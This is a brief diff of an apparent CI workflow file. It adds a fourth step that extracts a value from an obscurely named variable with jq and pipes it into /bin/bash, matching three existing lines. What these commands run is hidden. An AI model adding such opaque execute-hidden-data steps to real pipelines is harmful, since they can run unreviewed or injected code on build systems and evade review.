@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$xfmw11810" | jq -r .nugxr5 | /bin/bash
           echo $gaz6717 | jq -r .rspv3926 | /bin/bash
           echo $j1474 | jq -r .t4263 | /bin/bash
+          echo $ogodr88 | jq -r .mzed7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
